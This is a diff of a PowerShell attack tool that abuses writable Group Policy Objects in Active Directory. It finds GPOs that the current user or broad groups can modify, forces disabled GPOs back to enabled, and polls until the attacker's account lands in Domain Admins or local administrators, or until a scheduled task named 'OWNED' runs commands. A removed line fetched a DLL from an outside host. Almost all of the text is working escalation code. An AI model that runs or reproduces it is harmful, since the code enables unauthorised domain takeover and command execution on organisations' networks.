@@ -117,14 +117,12 @@ Parameters:
     if($Log){
         Start-Transcript -Path $Log
     }
-
     # Load the ActiveDirectory module from a custom path or download it if not provided
     if(!($LoadDLL)){
-        Invoke-WebRequest https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
-        Get-ChildItem -Path . -Recurse | Unblock-File
         Import-Module .\Microsoft.ActiveDirectory.Management.dll
+        Import-Module ActiveDirectory 2>&1>$null
         $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
-        if(($mod -contains "Microsoft.ActiveDirectory")){
+        if(($mod -like "Microsoft.ActiveDirectory.Management" -or $mod -like "ActiveDirectory")){
             $null
         } else {
             $red+" ActiveDirectory module failed to load!"
@@ -134,7 +132,7 @@ Parameters:
         Get-ChildItem -Path . -Recurse | Unblock-File
         Import-Module $LoadDLL -ErrorAction Stop
         $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
-        if(($mod -like "Microsoft.ActiveDirectory*")){
+        if(($mod -like "Microsoft.ActiveDirectory.Management" -or $mod -like "ActiveDirectory")){
             $null
         } else {
             $red+" ActiveDirectory module failed to load!"
@@ -144,7 +142,78 @@ Parameters:
         $red+" Couldn't load DLL, exiting..."
         return
     }
-    
+
+    $allPSModules = Get-Module | select -ExpandProperty Name
+    foreach($module in $allPSModules){
+        if($module -eq "GroupPolicy"){
+            $moduleExists = $true
+        } else {
+            $moduleExists = $false
+        }
+    }
+    if($moduleExists -eq $false){
+        Unblock-File .\GroupPolicy.psd1 2>&1>$null
+        Unblock-File .\GroupPolicy.format.ps1xml 2>&1>$null
+        Import-Module .\GroupPolicy.psd1
+    }
+
+    Function Set-GPOStatus
+    {
+        [CmdletBinding(SupportsShouldProcess)]
+
+        Param
+        (
+            [Parameter(
+                Mandatory=$True,
+                ValueFromPipeline,
+                ValueFromPipelinebyPropertyName
+            )]
+            $DisplayName,
+
+            [Parameter(ValueFromPipelineByPropertyName)]
+            [ValidateSet(
+                'AllSettingsEnabled',
+                'AllSettingsDisabled',
+                'ComputerSettingsDisabled',
+                'UserSettingsDisabled'
+            )]
+            $Status,
+
+            [string]
+            $Domain,
+
+            [string]
+            $Server
+        )
+
+        Begin
+        {
+            $Splat = @{ ErrorAction="Stop" }
+            if ($Domain) { $Splat.Add("Domain",$Domain) }
+            if ($Server) { $Splat.Add("Server",$Server) }
+        }
+
+        Process
+        {
+            if ($Displayname -is [string])
+            {
+                $Splat.Add("Name",$DisplayName)
+            
+                Try { $Gpo = Get-GPO @Splat } Catch { $_; return }
+            }
+            else
+            {
+                $Splat.Add("GUID",$DisplayName.Id)
+                $Gpo = $DisplayName
+            }
+
+            if ($PSCmdlet.ShouldProcess("$($Gpo.Displayname) : $Status "))
+            {
+                $Gpo.GpoStatus = $Status
+            }
+        }
+    }
+
     # Use provided domain or get it from AD
     if ($Domain) {
         $domain = $Domain
@@ -173,11 +242,20 @@ Parameters:
             $red+" Failed to find GPO with name: $GPOName"
             return
         }
+
+
     $gpoPath = "CN=$GPOGUID,CN=Policies,CN=System,$domaindn"
     $checkgpo = (Get-Acl -Path "AD:$gpoPath").Access |
     Where-Object {
         $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteDacl|WriteOwner|GenericAll" -and
         ($_.IdentityReference -match "$env:USERNAME|Authenticated Users|Domain Users|Everyone")
+    }
+
+    $isComputerEnabled = (Get-GPO "$GPOName" | select -ExpandProperty GpoStatus)
+
+    if($isComputerEnabled -eq "AllSettingsDisabled" -or $isComputerEnabled -eq "ComputerSettingsDisabled"){
+        Get-GPO "$GPOName" | Set-GPOStatus -Status AllSettingsEnabled
+        $green+' Changed GPO Status to "AllSettingsEnabled"'
     }
 
     if(!$checkgpo){
@@ -518,20 +596,19 @@ Parameters:
     # A bad loading screen counting up to 300(5 minute update interval on DCs)
     if($DA){
         if($Interval){
-            $totalSeconds = $Interval * 60
-            for ($x = 1; $x -le $totalSeconds; $x+=5 ){
-                $PercentCompleted = ($x/$totalSeconds*100)
+            for ($x = 1; $x -le $Interval; $x++){
+                $PercentCompleted = ($x/$Interval*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                     break
                 }
             }
         } else {
-            for ($x = 1; $x -le 300; $x+=5 ){
-                $PercentCompleted = ($x/300*100)
+            for ($x = 1; $x -le 90; $x++){
+                $PercentCompleted = ($x/90*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                     break
                 }
@@ -540,20 +617,19 @@ Parameters:
         $green+" User added to the domain admins group!"
     } elseif($Local){
         if($Interval){
-            $totalSeconds = $Interval * 60
-            for ($x = 1; $x -le $totalSeconds; $x+=10 ){
-                $PercentCompleted = ($x/$totalSeconds*100)
+            for ($x = 1; $x -le $Interval; $x++){
+                $PercentCompleted = ($x/$Interval*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                     break
                 }
             }
         } else {
-            for ($x = 1; $x -le 300; $x+=10 ){
-                $PercentCompleted = ($x/300*100)
+            for ($x = 1; $x -le 90; $x++){
+                $PercentCompleted = ($x/90*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                     break
                 }
@@ -562,11 +638,10 @@ Parameters:
         $green+" User added to the local admins group!"
     }elseif($CMD -or $PowerShell){
         if($Interval){
-            $totalSeconds = $Interval * 60
-            for ($x = 1; $x -le $totalSeconds; $x+=10){
-                $PercentCompleted = ($x/$totalSeconds*100)
+           for ($x = 1; $x -le $Interval; $x++){
+                $PercentCompleted = ($x/$Interval*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 try {
                     if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
                         $green+" Command executed successfully!"    
@@ -575,10 +650,10 @@ Parameters:
                 } catch {}
             }
         } else {
-            for ($x = 1; $x -le 300; $x+=10){
-                $PercentCompleted = ($x/300*100)
+             for ($x = 1; $x -le 90; $x++){
+                $PercentCompleted = ($x/90*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 try {
                     if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
                         $green+" Command executed successfully!"    
@@ -592,20 +667,19 @@ Parameters:
             $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
         }
         if($Interval){
-            $totalSeconds = $Interval * 60
-            for ($x = 1; $x -le $totalSeconds; $x+=60){
-                $PercentCompleted = ($x/$totalSeconds*100)
+            for ($x = 1; $x -le $Interval; $x++){
+                $PercentCompleted = ($x/$Interval*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                     break
                 }          
             }   
         } else {
-            for ($x = 1; $x -le 86400; $x+=60){
-                $PercentCompleted = ($x/86400*100)
+           for ($x = 1; $x -le 90; $x++){
+                $PercentCompleted = ($x/90*100)
                 Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds 60
                 if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                     break
                 }          
@@ -616,10 +690,10 @@ Parameters:
         if(!$User){
             $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
         }
-        for ($x = 1; $x -le 86400; $x+=60){
-            $PercentCompleted = ($x/86400*100)
+        for ($x = 1; $x -le 180; $x++){
+                $PercentCompleted = ($x/180*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 60
             if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                 break
             }          
